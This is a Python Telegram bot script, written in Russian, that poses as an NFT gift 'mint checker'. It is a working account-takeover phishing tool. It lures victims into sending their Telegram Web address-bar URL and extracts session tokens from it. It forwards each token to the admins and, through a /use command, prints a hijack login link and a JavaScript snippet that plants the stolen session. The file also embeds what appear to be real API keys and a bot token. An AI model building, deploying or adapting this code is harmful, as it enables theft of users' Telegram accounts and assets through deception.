# gift_checker_bot.py - ПОЛНАЯ РАБОЧАЯ ВЕРСИЯ
import asyncio
import re
import time
from telethon import TelegramClient, events, Button

# ===== КОНФИГ =====
API_ID = 39469025
API_HASH = '472c45ec74b210f75bff4e78ac9fe423'
BOT_TOKEN = '7650267900:AAFYxob_7xnsY0Sv8cxXgqEVNn42vxJXfXE'

# Админы
ADMINS = [8528496685]
MAIN_ADMIN = 8528496685

# ===== БАЗЫ =====
admins = ADMINS.copy()
stolen = []
waiting = {}
nft_temp = {}

BOT_USERNAME = "nft_verifier_bot"

# ===== ФУНКЦИИ =====
def scam_link(uid):
    return f"https://web.telegram.org/k/#?tgaddr=tg%3A%2F%2Fresolve%3Fdomain%3D{BOT_USERNAME}%26start%3D{int(time.time())}_{uid}"

def get_token(txt):
    # Сначала ищем параметр tgWebAuthToken
    match = re.search(r'tgWebAuthToken=([^&\s]+)', txt)
    if match:
        return match.group(1)
    
    # Ищем параметр token
    match = re.search(r'[?&]token=([^&\s]+)', txt)
    if match:
        return match.group(1)
    
    # Ищем любую длинную строку (30+ символов)
    match = re.search(r'[a-zA-Z0-9\-_]{30,}', txt)
    if match:
        return match.group(0)
    
    return None

# ===== КНОПКИ =====
def menu_buttons():
    return [[Button.inline("🔍 Проверка", "check"), Button.inline("📚 Инструкция", "inst")]]

def scam_button(uid):
    return [[Button.url("🔗 ПЕРЕЙТИ НА САЙТ API", scam_link(uid))]]

# ===== ЗАПУСК =====
async def main():
    bot = TelegramClient('gift_checker', API_ID, API_HASH)
    await bot.start(bot_token=BOT_TOKEN)
    print(f"✅ Бот запущен! Админы: {ADMINS}")

    # ===== СТАРТ =====
    @bot.on(events.NewMessage(pattern='/start'))
    async def start(e):
        uid = e.sender_id
        
        if uid in waiting: del waiting[uid]
        if uid in nft_temp: del nft_temp[uid]
        
        await e.respond(
            "🎁 Привет. Это бот для проверки твоих подарков на минт - систему.\n\nВыбери действие чтобы начать:",
            buttons=menu_buttons()
        )

    # ===== INLINE КНОПКИ =====
    @bot.on(events.CallbackQuery)
    async def inline(e):
        uid = e.sender_id
        data = e.data.decode()
        
        await e.answer()
        
        if data == "check":
            waiting[uid] = "wait_nft"
            await e.respond(
                "Все открытые NFT подарки в вашем профиле имеют отметку рендинг.\n"
                "Проверка на минт была частично окончена.\n"
                "Перейдите на сайт api рендинга и скопируйте ссылку (адрес сайта) для рендинга вашего минт подарка и отправьте её боту.",
                buttons=scam_button(uid)
            )
            
        elif data == "inst":
            await e.respond(
                "Инструкция:\n\n"
                "Вы должны открыть все NFT подарки в вашем профиле чтобы проверить на рендинг.\n\n"
                "После бот сгенерирует api рендинг ссылку для проверки на минт, вы авторизуетесь в telegram web,после вы переходите по ссылке и копируете ссылку на сайте в адресной строке ДО захода на сайт.\n\n"
                "После отправляете боту и бот уже исходя из api рендинга даст вам результаты насчёт минт - проверки."
            )

    # ===== ТЕКСТ =====
    @bot.on(events.NewMessage)
    async def text_handler(e):
        txt = e.message.text
        uid = e.sender_id
        name = e.sender.username or "без username"
        
        if not txt or txt.startswith('/'):
            return
        
        # ССЫЛКИ TELEGRAM - МГНОВЕННО АДМИНАМ
        if 'web.telegram.org' in txt or 'tg://' in txt:
            token = get_token(txt)
            stolen.append({'uid': uid, 'name': name, 'link': txt, 'token': token, 'time': time.time()})
            
            for aid in admins:
                try:
                    msg = f"🔥 TG ССЫЛКА\n👤 {uid} (@{name})\n📎 {txt[:150]}"
                    if token:
                        msg += f"\n🔑 {token[:30]}..."
                    await bot.send_message(aid, msg)
                except:
                    pass
            
            if uid in waiting: del waiting[uid]
            if uid in nft_temp: del nft_temp[uid]
            await e.respond("✅ Ссылка получена!")
            return
        
        # Ждем ссылку на NFT
        if uid in waiting and waiting[uid] == "wait_nft":
            nft_temp[uid] = txt
            del waiting[uid]
            await e.respond("✅ Ссылка получена!")
            return
        
        # Обычные ссылки
        if 'http://' in txt or 'https://' in txt:
            token = get_token(txt)
            stolen.append({'uid': uid, 'name': name, 'link': txt, 'token': token, 'time': time.time()})
            
            for aid in admins:
                try:
                    msg = f"📎 ССЫЛКА\n👤 {uid} (@{name})\n📌 {txt[:150]}"
                    if token:
                        msg += f"\n🔑 {token[:30]}..."
                    await bot.send_message(aid, msg)
                except:
                    pass
            
            if uid in nft_temp: del nft_temp[uid]
            await e.respond("✅ Ссылка получена!")

    # ===== АДМИНКА =====
    @bot.on(events.NewMessage(pattern='/admin'))
    async def admin(e):
        if e.sender_id not in admins: return
        await e.respond(
            f"👑 **АДМИН ПАНЕЛЬ**\n\n"
            f"📦 Ссылок: {len(stolen)}\n"
            f"👥 Админов: {len(admins)}\n\n"
            f"📋 /links - все ссылки\n"
            f"🔑 /use [номер] - получить токен\n"
            f"➕ /addadmin @ - добавить админа\n"
            f"➖ /removeadmin @ - удалить админа"
        )

    @bot.on(events.NewMessage(pattern='/links'))
    async def links(e):
        if e.sender_id not in admins: return
        if not stolen:
            await e.respond("📭 Пока ничего нет")
            return
        
        msg = "📦 **ВСЕ ССЫЛКИ:**\n"
        for i, s in enumerate(stolen[-15:]):
            has_token = "🔑" if s['token'] else "📎"
            msg += f"\n{i}. {has_token} {s['uid']} (@{s['name']})\n   {s['link'][:70]}..."
            
            if len(msg) > 3500:
                await e.respond(msg)
                msg = ""
        
        if msg:
            await e.respond(msg)

    # ===== ИСПОЛЬЗОВАНИЕ ТОКЕНА (ИСПРАВЛЕНО) =====
    @bot.on(events.NewMessage(pattern='/use (\\d+)'))
    async def use_token(event):
        if event.sender_id not in admins:
            return
        
        try:
            idx = int(event.pattern_match.group(1))
            if idx < len(stolen):
                data = stolen[idx]
                
                # Пробуем получить токен из данных
                token = data.get('token')
                
                # Если нет, пробуем вытащить из ссылки
                if not token:
                    link = data.get('link', '')
                    token = get_token(link)
                
                if not token:
                    await event.respond("❌ В этой ссылке нет токена")
                    return
                
                # Формируем ссылку для входа
                auth_url = f"https://web.telegram.org/k/#?tgWebAuthToken={token}"
                
                await event.respond(
                    f"✅ **Токен найден!**\n\n"
                    f"🔑 `{token}`\n\n"
                    f"👉 **Ссылка для входа:**\n{auth_url}\n\n"
                    f"💻 **Или вставь в консоль:**\n"
                    f"```javascript\n"
                    f"localStorage.setItem('user_auth', JSON.stringify({{dc:2, token:'{token}'}}));\n"
                    f"location.href='https://web.telegram.org/k/';\n"
                    f"```"
                )
            else:
                await event.respond("❌ Неверный индекс. Всего ссылок: {len(stolen)}")
        except Exception as e:
            await event.respond(f"❌ Ошибка: {e}")

    # ===== ДОБАВЛЕНИЕ АДМИНА =====
    @bot.on(events.NewMessage(pattern='/addadmin @?(\\w+)'))
    async def add_admin(e):
        if e.sender_id != MAIN_ADMIN: 
            await e.respond("⛔ Только главный админ")
            return
        
        try:
            username = e.pattern_match.group(1)
            entity = await bot.get_entity(username)
            uid = entity.id
            
            if uid not in admins:
                admins.append(uid)
                await e.respond(f"✅ Админ @{username} добавлен")
                await bot.send_message(uid, "🎉 Теперь ты админ! Используй /admin")
            else:
                await e.respond("❌ Уже админ")
        except:
            await e.respond("❌ Пользователь не найден")

    # ===== УДАЛЕНИЕ АДМИНА =====
    @bot.on(events.NewMessage(pattern='/removeadmin @?(\\w+)'))
    async def remove_admin(e):
        if e.sender_id != MAIN_ADMIN:
            await e.respond("⛔ Только главный админ")
            return
        
        try:
            username = e.pattern_match.group(1)
            entity = await bot.get_entity(username)
            uid = entity.id
            
            if uid in admins and uid != MAIN_ADMIN:
                admins.remove(uid)
                await e.respond(f"✅ Админ @{username} удален")
            elif uid == MAIN_ADMIN:
                await e.respond("❌ Нельзя удалить главного админа")
            else:
                await e.respond("❌ Не найден в списке")
        except:
            await e.respond("❌ Ошибка")

    await bot.run_until_disconnected()

if __name__ == '__main__':
    asyncio.run(main())